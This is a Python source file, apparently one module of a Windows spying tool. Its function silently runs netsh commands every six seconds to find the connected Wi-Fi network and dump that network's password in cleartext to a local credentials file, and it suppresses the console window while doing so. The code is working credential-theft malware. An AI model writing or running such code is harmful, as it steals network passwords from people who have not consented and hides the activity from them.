#!/usr/bin/env python

from Settings import *
from paths import *
from savefile import *



def get_wifi_credentials():

    """This function get the credentials of the connected
        interface"""

        
    threading.Timer(6, get_wifi_credentials).start() 
    
   # try:

   # if the folder does not exist, create one
    if not os.path.exists(folder_path):
        
          os.mkdir(folder_path)
          
    file_name = open(creds, "a+")
    
    # execture cmd commands silently wihtout poping window
    si = subprocess.STARTUPINFO()

    # dwflag is a parameter that tells the function
    # what type of information to gather
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW

    # execute interface command to show the current connected interface,
    # the command is exexuted silently
    subprocess.call("netsh wlan show interfaces", stdout=file_name , startupinfo=si)

    # Once the command executer, get the name of the interface
    # extract all words and put them in a list
    creds_file = open(creds, 'r')
    text = creds_file.read()
    creds_file.close()
    
    # look for the colon that separates profile name form the actual name
    text = re.sub('[\: \']+', " ", text)
    words = list(text.split())


    # loop through the list and get the interface name
    output_list = []
    for word in words:
        output_list.append(word)

    word_index = output_list.index('connected') + 2

    #print output_list[word_index]

    # if word "Profile" in the saved file, get the password credentials of the connected
    # interface
    if 'Profile' in open(creds).read():
        subprocess.call("netsh wlan show profile name="+ output_list[word_index] + " key=clear", stdout=file_name, startupinfo=si)
    else:
        pass

##    except:
##                # TODO SEND AN ALERT EMAIL WITH ERRO
##                print "There is something worng with extarcting wifi passwords"
##
            


